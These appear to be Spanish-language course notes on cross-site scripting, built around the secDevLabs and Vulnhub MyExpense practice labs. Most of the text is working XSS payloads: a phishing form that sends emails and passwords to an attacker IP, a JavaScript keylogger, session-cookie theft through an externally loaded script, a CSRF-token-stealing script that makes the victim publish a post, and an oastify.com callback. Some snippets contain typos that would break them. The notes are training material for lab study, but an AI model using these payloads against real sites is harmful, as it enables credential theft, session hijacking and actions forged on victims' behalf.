# Cross-Site Scripting

Tags: #XSS #OWASP #Explotacion 

Una vulnerabilidad **XSS** (**Cross-Site Scripting**) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.

En esencia, un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso puede ser cualquier cosa, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.

Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:

-   **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
-   **Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
-   **DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

Los ataques XSS pueden tener graves consecuencias para las empresas y los usuarios individuales. Por esta razón, es esencial que los desarrolladores web implementen medidas de seguridad adecuadas para prevenir vulnerabilidades XSS. Estas medidas pueden incluir la validación de datos de entrada, la eliminación de código HTML peligroso, y la limitación de los permisos de JavaScript en el navegador del usuario.

A continuación, se proporciona el proyecto de GitHub correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:

-   **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
* [Ejercicios-XSS](https://sudo.co.il/xss/)

Los XSS pueden interpretar código en **HTML y/o  JavaScript** y es ahí en donde podemos colocar las inyecciones.

## HTML

```javascript
<h1>Hola</h1>                                                              /// Podemos hacer inyecciones con codigo HTML
<marquee>Hola</marquee>                                                    /// Podemos usar marquee para que el texto nos salga animado, de izquierda a derecha 

<a href="https://www.ionos.mx/digitalguide/URL">Texto ancla</a>            /// Para colocar un enlace 

<img src="images/imagen.png">                                              /// Para agregar una imagen
<img src="https://test.com/images/imagen.png">

<img src="X" onerror=alert(1) />                                                     /// Para colocar un alert basado en un error 

<iframe src="http://ejemplo.org/demo.html" height="400" width="800" name="demo">     /// Para agregar una pagina dentro de otra pagina con dimenciones 
  <p>Su navegador no es compatible con iframes</p>
</iframe>
```

## JavaScript en la web

```javascript
<script>alert("XSS")</script>          /// Creamos una ventana emergente con codigo javascript que dice XSS
<script>prompt('Mensaje')</script>     /// Ventana emergente para ingresar algun dato                

<script>                               /// Para mandar algo por el metodo POST a un dominio 
  fetch('https://kwklry4t8e18m8q8k5uikgydy44vslga.oastify.com',{method:'POST', mode:'no-cors', body:'omar'});
</script>
```

## Recibir información por medio de un 'Alert'  

```javascript
// Podemos crear un script en donde nos devuelva el correo o algún dato a nuestra IP. 

<script>
    var email = prompt("Por favor, introduce tu correo electronico para visualizar el post", "example@example.com");

    if (email == null || email == ""){   
        alert("Es necesario introducir un correo para ver el post");
    } else{
        fetch("http://192.168.68.108/?email=" + email );  
    }
</script>

	/// If = Verificar si el correo esta vacio o no
	/// fetch = Realizar una peticion a nuestra IP de atacante para recibir la informacion 
```

```bash
❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para recibir las peticiones 
```

## Recibir información 

```html
<!-- También lo podemos hacer con HTML y Javascript para poder hacer un (Phishing), el cual nos regresara a nuestra maquina victima el correo y la passwd de la victima -->

<div id="formContainer"></div>

<script>
	var email;
	var password;
	var form = '<form>' +
		'Email: <input type="email" id="email" required>' +
		' Contrasena: <input type="password" id="password" required>' +
		'<input type="button" onclick="submitForm()" value="Submit">' +
		'</form>';
		
	document.getElementByld("formContainer”).innerHTML = form;
	
	function submitForm() {
		email = document.getElementByld("email").value;
		password = document.getElementByld("password").value;
		fetch("http://192.168.68.108/?email=" + email + "&password="+ password);
	}
</script>
```

```bash
❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para recibir las peticiones 
```


## Keylogger JavaScript

```javascript
// Podriamos ver las pulsaciones de teclado en tiempo real dentro de la web

<script>
   var k = "";    
   document.onkeypress = funtion(e){
        e = e || window.event;                 // Opcional para que en cualquier navegador funcione el Keylogger
        k += e.key;
        var i = new Image();
        i.src = "http://192.168.68.111/" + k;
    };
</script>

	// K = Variable que almacena las pulsaciones  
```

```bash
❯ python3 -m http.server 80  | grep -oP "GET /\k[^.*\s]+"      # Nos montamos un servidor http 80 para recibir las peticiones y que las filtre 
```

## Redirección al usuario 

```javascript
// Podemos crear un Script para redirigir al usuario a otra pagina web 

<script>
	window.location.href = "https://hack4u.io";
</script>
```

## Cookie Hijacking

Web para identificar un [Json Web Token](https://jwt.io/), este se encuentra en: **Ctrl + Shift + c > Application/Storage > Session**

External JavaScript Source, podemos cargar código desde un servidor externo para tratar de robarle la cookie de sesión.
* Debemos de ver en la web que no tenga activado el **httpOnly** el cual se encuentra en **Application** ya que eso impediría poder robarla.
* Esto seria un **Cookie Hijacking**

```javascript
// 1. Esto lo colocaremos en la web en donde se acontece el XSS

<script src="http://192.168.68.111/test.js"></script>    // Colomos la IP de atacante y el nombre del archivo malicioso
```

```javascript
// 2. En nuestra maquina de atacante crearemos este archivo 'js' con el cual robaremos la Cookie de Sesion del usuario, o tambien  podemos hacer que el usuario victima (admin) haga una accion especifica en la web 

❯ nvim test.js                                                  // Creamos el archivo js

	var request = new XMLHttpRequest();                        // Nos permite controlar peticiones 
	request.open('GET', 'http://192.168.68.111/?cookie=' + document.cookie);
	request.send();         
```

```bash
❯ python3 -m http.server 80               # Nos montamos un servidor http 80 para que la victima acceda al archivo malicioso 

# Después de tener la 'Cookie de Session' podemos pegarla en donde se encuentra la nuestra 'sustituyendola' en la web y así cuando recarguemos la pagina, iniciaremos como el otro usuario.
```

## Victima cree un post en una web 

```javascript
// 1. Esto lo colocaremos en la web de prueba y crearemos la publicación

<script src="http://192.168.68.111/pwned.js"></script>  // Colomos la IP de atacante y el nombre del archivo malicioso
```

```javascript
// Esto se usa una vez obtenido la 'csrf_token y value', los datos los obtenemos con BurpSuite al momento de crear una publicacion 

❯ nvim pwned.js                                                 // Creamos el archivo js

	var domain = "http://localhost:10007/newgossip";
	var req1 = new XMLHttpRequest();
	req1.open('GET', domain, false);
	req1.withcredentials = true;                               // Por si el Token es Dinamico y asi lo volvemos Estatico
	req1.send();
	
	var response = req1.responseText;
	var parser = new DOMParser();
	var doc = parser.parserFromString(respose, 'text/html');
	var token = doc.getElementsByName("_csrf_token")[0].value;
	
	var req2 = new XMLHttpRequest();
	var data = "title=HACKED&subtitle=HaCkEd&text=HAC%20ked&_csrf_token=" + token;   // El %20 es un espacio en urlencode
	req2.open('POST', 'http://localhost:10007/newgossip', false); 
	req2.withcredentials = true;
	req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	req2.send(data);
```

```bash
❯ python3 -m http.server 80            # Nos montamos un servidor http 80 para que el usuario pueda acceder a nuestro archivo malicioso 
```

## Maquina para practicar los XSS

En esta clase, trataremos de resolver una máquina de la plataforma de **Vulnhub** para practicar los ataques XSS.

Vulnhub es una plataforma de seguridad informática que se centra en la creación y distribución de máquinas virtuales vulnerables con el fin de mejorar las habilidades de los profesionales de la seguridad informática. La plataforma proporciona una amplia variedad de máquinas virtuales (VM) que se han configurado para contener vulnerabilidades deliberadas que pueden ser explotadas para aprender y reforzar técnicas de hacking.

A continuación, se proporciona el enlace a la máquina que nos descargamos en esta clase para practicar esta vulnerabilidad:

-   **Máquina MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)


